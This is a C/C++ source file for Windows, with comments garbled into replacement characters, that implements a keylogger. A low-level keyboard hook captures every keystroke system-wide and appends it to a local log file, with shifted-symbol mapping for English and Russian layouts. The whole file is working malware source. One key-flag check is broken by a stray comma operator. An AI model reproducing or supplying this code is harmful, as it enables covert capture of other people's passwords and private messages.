#include <Windows.h>
#include <Winuser.h>
#include <malloc.h> // ��� ������ � ������������ �������
#include <locale.h> // �����������
#include <string.h>
#include <stdio.h> // ��� ������ � ����

// ���������
#define SIZE_STR 1 << 8 //������ ������ ������� ������� 256 ���������
#define PATH L"D:\\1\key.log" //���� � �����
#define RUS 0x0419 // ����������� ��������� ����������
#define ENG 0x0409

BOOL IsCaps(void); // �������� ����� �� ���� ��� ����
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam); // �����������
VOID WriteToFile(LPWSTR wstr); // ������ � ����
LPWSTR Text(const wchar_t* str); // ���������� ���� ��� �����

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmd, int nCmdShow)
{
	// ����� ���, ���������� ����
	HHOOK hHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // ��������, ������� ��������� �� �� ��� �� ������ ��� �� ������� ����������
		LogKey, // ��������� �� ������� � ������� ����� ���������
		NULL, NULL // wParam and lParam
	);
	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);
	return 0;
}



LPWSTR Text(const wchar_t* str)
{
	return const_cast<LPWSTR>(str);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

BOOL IsCaps(void) // �������� ��������� �� �� � ������ ��������
{
	// VK - virtual key
	// GetKeyState - ��� ����������� ��������� ������� ������
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
	
		return TRUE;
	
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam; // ��������� ��� �������� ���������� � ������ ��� ��������� ���� ������
		// �������� �� ������ � �������� �� 16 ���������
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16; // ��� ��������� ������� ������
		if (!(pHook->vkCode, +1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR)); // �������� ������������ ������
		GetKeyNameText(iKey, wstr, SIZE_STR); // ��������� ����� ������
		if (wcslen(wstr) > 1)
		{
			WriteToFile(Text(L"["));
			WriteToFile(wstr);
			WriteToFile(Text(L"]"));
		}
		else
		{
			if (IsCaps() == TRUE)
			{
				switch (wstr[0])
				{
				case '1':
					WriteToFile(Text(L"!"));
					break;
				case '2':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"@"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"\""));
					break;
				case '3':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"#"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case '4':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"$"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L";"));
					break;
				case '5':
					WriteToFile(Text(L"%"));
					break;
				case '6':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"^"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L":"));
					break;
				case '7':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"&"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"?"));
					break;
				case '8':
					WriteToFile(Text(L"*"));
					break;
				case '9':
					WriteToFile(Text(L"("));
					break;
				case '0':
					WriteToFile(Text(L")"));
					break;
				case '-':
					WriteToFile(Text(L"_"));
					break;
				case '=':
					WriteToFile(Text(L"+"));
					break;
				case '[':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"{"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case ']':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"}"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case ';':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L":"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case '\'':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"\""));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case ',':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"<"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case '.':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L">"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;
				case '/':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"?"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L","));
					break;
				case '\\':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"|"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"/"));
					break;
				case '`':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"~"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"�"));
					break;

				default:
					WriteToFile(wstr);
					break;
				}

			}
			else
			{
				wstr[0] = tolower(wstr[0]);
				WriteToFile(wstr);
			}
		}
		free(wstr); // ������� ������ ��� �� ���������� �� ����������� � ����������
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam); // ������������ ������ ������
}